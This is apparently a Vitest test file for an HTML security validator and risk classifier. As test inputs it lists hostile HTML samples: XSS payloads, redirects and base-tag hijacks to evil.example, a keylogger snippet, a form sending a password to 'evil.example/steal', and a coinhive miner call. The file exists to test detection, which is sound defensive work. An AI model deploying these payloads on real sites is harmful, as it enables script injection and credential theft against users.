import { describe, expect, it } from 'vitest'
import {
  normalizeContentFormat,
  validateHtmlForSubmission,
  detectHtmlFeatures,
  classifyHtmlRisk,
  RISK_TIER,
} from '../src/lib/htmlSecurity'

describe('htmlSecurity', () => {
  it('normalizes content format with markdown default', () => {
    expect(normalizeContentFormat('html')).toBe('html')
    expect(normalizeContentFormat('HTML')).toBe('html')
    expect(normalizeContentFormat('markdown')).toBe('markdown')
    expect(normalizeContentFormat('unknown')).toBe('markdown')
    expect(normalizeContentFormat('')).toBe('markdown')
  })

  describe('validateHtmlForSubmission (backward compat)', () => {
    it('allows safe html payloads', () => {
      const result = validateHtmlForSubmission('<main><h1>StudyHub</h1><p>Safe content.</p></main>')
      expect(result.ok).toBe(true)
      expect(result.issues).toEqual([])
    })

    it('detects script, iframe, inline handlers, and dangerous urls', () => {
      const flaggedCases = [
        '<script>alert(1)</script>',
        '<iframe src="https://evil.example"></iframe>',
        '<img src="x" onerror="alert(1)" />',
        '<a href="javascript:alert(1)">click</a>',
        '<a href="vbscript:msgbox(1)">click</a>',
        '<img src="data:image/svg+xml;base64,PHN2Zy8+" />',
        '<iframe src="data:text/html;base64,SGk="></iframe>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<base href="https://evil.example/">',
      ]

      for (const html of flaggedCases) {
        const result = validateHtmlForSubmission(html)
        expect(result.ok).toBe(false)
        expect(result.issues.length).toBeGreaterThan(0)
      }
    })

    it('detects empty and oversized html payloads', () => {
      expect(validateHtmlForSubmission('   ').ok).toBe(false)

      const oversized = `<div>${'x'.repeat(350001)}</div>`
      const oversizedResult = validateHtmlForSubmission(oversized)
      expect(oversizedResult.ok).toBe(false)
      expect(oversizedResult.issues.join(' ')).toMatch(/350,000/i)
    })
  })

  describe('detectHtmlFeatures', () => {
    it('returns empty features for safe HTML', () => {
      const { features } = detectHtmlFeatures('<h1>Hello</h1>')
      expect(features).toEqual([])
    })

    it('detects suspicious tags', () => {
      const { features } = detectHtmlFeatures('<script>alert(1)</script>')
      expect(features.some((f) => f.category === 'suspicious-tag')).toBe(true)
    })

    it('detects inline handlers', () => {
      const { features } = detectHtmlFeatures('<img src="x" onerror="alert(1)">')
      expect(features.some((f) => f.category === 'inline-handler')).toBe(true)
    })

    it('detects dangerous URLs', () => {
      const { features } = detectHtmlFeatures('<a href="javascript:void(0)">x</a>')
      expect(features.some((f) => f.category === 'dangerous-url')).toBe(true)
    })
  })

  describe('classifyHtmlRisk', () => {
    it('returns Tier 0 for clean HTML', () => {
      const result = classifyHtmlRisk('<main><h1>Hello</h1><p>World</p></main>')
      expect(result.tier).toBe(RISK_TIER.CLEAN)
      expect(result.findings).toEqual([])
    })

    it('returns Tier 1 for HTML with script tag', () => {
      const result = classifyHtmlRisk('<script>console.log("hi")</script>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.length).toBeGreaterThan(0)
    })

    it('returns Tier 1 for HTML with iframe', () => {
      const result = classifyHtmlRisk('<iframe src="about:blank"></iframe>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
    })

    it('returns Tier 1 for HTML with inline handler', () => {
      const result = classifyHtmlRisk('<div onclick="alert(1)">click</div>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
    })

    it('returns Tier 2 for obfuscated JS (heavy String.fromCharCode)', () => {
      const html = '<script>' + 'String.fromCharCode(65);'.repeat(5) + '</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
    })

    it('returns Tier 2 for page redirect patterns', () => {
      const html = '<script>window.location.href = "https://evil.example";</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'redirect')).toBe(true)
    })

    it('returns Tier 2 for keylogging pattern', () => {
      const html = '<script>document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'keylogging')).toBe(true)
    })

    it('returns Tier 2 for form exfiltration', () => {
      const html = '<form action="https://evil.example/steal"><input name="password"></form>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'exfiltration')).toBe(true)
    })

    it('returns Tier 2 for crypto-miner signature', () => {
      const html = '<script>coinhive.start();</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'crypto-miner')).toBe(true)
    })

    it('returns Tier 2 for eval/fetch JS risk patterns', () => {
      const html = '<script>eval("alert(1)");</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'js-risk')).toBe(true)
    })

    it('includes a summary string', () => {
      const clean = classifyHtmlRisk('<p>Hello</p>')
      expect(clean.summary).toContain('No suspicious')

      const flagged = classifyHtmlRisk('<script>x</script>')
      expect(flagged.summary).toContain('Flagged')
    })
  })
})
